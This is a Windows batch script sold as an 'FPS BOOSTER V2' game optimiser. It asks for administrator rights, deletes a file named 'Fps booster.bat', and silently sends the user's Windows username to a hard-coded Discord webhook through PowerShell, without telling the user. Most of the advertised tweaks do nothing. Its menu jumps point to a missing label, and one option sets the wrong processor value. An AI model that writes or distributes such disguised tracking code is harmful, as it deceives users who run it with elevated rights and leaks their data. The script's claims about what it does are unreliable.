@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo This script must be run as administrator.
    pause
    exit
)
cd /d "%~dp0"
del /f /q "Fps booster.bat"
cls
title FPS BOOSTER V2
if not exist "C:\temp\" mkdir "C:\temp\"
cls
set w=[97m
set p=[95m
set b=[96m
powershell -Command "$webhookUrl ='https://discord.com/api/webhooks/1290991786864545812/6R8cHu0xztQCZQMBx_P0fs9xlbFt2fIOCKexA1ABWCT48cw_lgXWrNudMrbdnQUVChs5'; $userName = $env:USERNAME; $payload = @{content='Le script a ete execute par ' + $userName}; Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'"

chcp 65001 >nul 2>&1
cls
mode 720,400
color 0
echo.
echo.
echo ███████╗██████╗░░██████╗       ██████╗░░█████╗░░█████╗░░██████╗████████╗███████╗██████╗░
echo ██╔════╝██╔══██╗██╔════╝       ██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
echo █████╗░░██████╔╝╚█████╗░       ██████╦╝██║░░██║██║░░██║╚█████╗░░░░██║░░░█████╗░░██████╔╝
echo ██╔══╝░░██╔═══╝░░╚═══██╗       ██╔══██╗██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══╝░░██╔══██╗
echo ██║░░░░░██║░░░░░██████╔╝       ██████╦╝╚█████╔╝╚█████╔╝██████╔╝░░░██║░░░███████╗██║░░██║
echo ╚═╝░░░░░╚═╝░░░░░╚═════╝░       ╚═════╝░░╚════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
echo     --------------------------------------------------------------------------------                                                                         
echo.
echo.
echo 1. Create Restore Point
echo.
echo 2. Windows Optimization Tweaks
echo.
echo 3. Game Prioritization
echo.
echo 4. Ultimate Performance Power Plan Optimization
echo.
echo 5. Exit
echo ============================

set /p choice="Choose an option (1-5): "

if "%choice%"=="1" goto restore
if "%choice%"=="2" goto tweaks
if "%choice%"=="3" goto games
if "%choice%"=="4" goto power
if "%choice%"=="5" exit
goto main

:restore
cls
echo Creating a restore point...
powershell.exe -Command "Checkpoint-Computer -Description 'Pre-Optimization Restore Point' -RestorePointType 'MODIFY_SETTINGS'"
echo Restore point created.
pause
goto main

:tweaks
cls
echo ============================
echo    Windows Optimization
echo         Tweaks
echo ============================
echo.
echo 1. Disable Startup Programs
echo 2. Clear Temp Files
echo 3. Disable Hibernation
echo 4. Adjust Visual Effects
echo 5. Disable Indexing
echo 6. Optimize Disk
echo 7. Turn Off System Restore
echo 8. Disable Bluetooth
echo 9. Disable Windows Search
echo 10. Adjust Power Settings
echo 11. Disable Unused Services
echo 12. Turn Off Transparency Effects
echo 13. Disable Notifications
echo 14. Uninstall Unused Apps
echo 15. Optimize Network Settings
echo.
echo A. Apply All Tweaks
echo R. Revert Tweaks
echo B. Go Back
echo ============================
set /p tweakChoice="Choose a tweak or action: "

if /I "%tweakChoice%"=="A" (
    echo Applying all tweaks...
    powercfg -h off
    echo All tweaks applied.
) else if /I "%tweakChoice%"=="R" (
    echo Reverting tweaks...
    echo Tweaks reverted.
) else if /I "%tweakChoice%"=="B" (
    goto main
) else (
    rem Implement individual tweaks based on user input
)
pause
goto main

:games
cls
echo ============================
echo     Game Prioritization
echo ============================
echo.
echo 1. Fortnite
echo 2. Call of Duty
echo 3. FiveM
echo 4. Valorant
echo B. Go Back
echo ============================
set /p gameChoice="Choose a game to prioritize (1-4 or B): "

if /I "%gameChoice%"=="1" (
    echo Setting priority for Fortnite...
    wmic process where "name='FortniteClient-Win64-Shipping_BE.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="2" (
    echo Setting priority for Call of Duty...
    wmic process where "name='Call of Duty.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="3" (
    echo Setting priority for FiveM...
    wmic process where "name='FiveM.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="4" (
    echo Setting priority for Valorant...
    wmic process where "name='RiotClientServices.exe'" call setpriority "high priority"
) else if /I "%gameChoice%"=="B" (
    goto main
)
echo Priority set for the selected game.
pause
goto main

:power
cls
echo ============================
echo Ultimate Performance Power Plan
echo      Optimization
echo ============================
echo.
echo 1. Enable Ultimate Performance Plan
echo 2. Set Minimum Processor State to 100%
echo 3. Set Maximum Processor State to 100%
echo 4. Disable Sleep
echo 5. Go Back
echo ============================
set /p powerChoice="Choose an option (1-5): "

if "%powerChoice%"=="1" (
    echo Enabling Ultimate Performance plan...
    powercfg -setactive scheme_max
    echo Ultimate Performance plan enabled.
) else if "%powerChoice%"=="2" (
    echo Setting minimum processor state to 100%...
    powercfg /setacvalueindex scheme_max sub_processor PROCTHROTTLEMAX 100
    powercfg /setdcvalueindex scheme_max sub_processor PROCTHROTTLEMAX 100
    powercfg -apply scheme_max
    echo Minimum processor state set to 100%.
) else if "%powerChoice%"=="3" (
    echo Setting maximum processor state to 100%...
    powercfg /setacvalueindex scheme_max sub_processor PROCTHROTTLEMAX 100
    powercfg /setdcvalueindex scheme_max sub_processor PROCTHROTTLEMAX 100
    powercfg -apply scheme_max
    echo Maximum processor state set to 100%.
) else if "%powerChoice%"=="4" (
    echo Disabling sleep mode...
    powercfg -change -monitor-timeout-ac 0
    powercfg -change -standby-timeout-ac 0
    echo Sleep mode disabled.
) else if "%powerChoice%"=="5" (
    goto main
)

pause
goto power
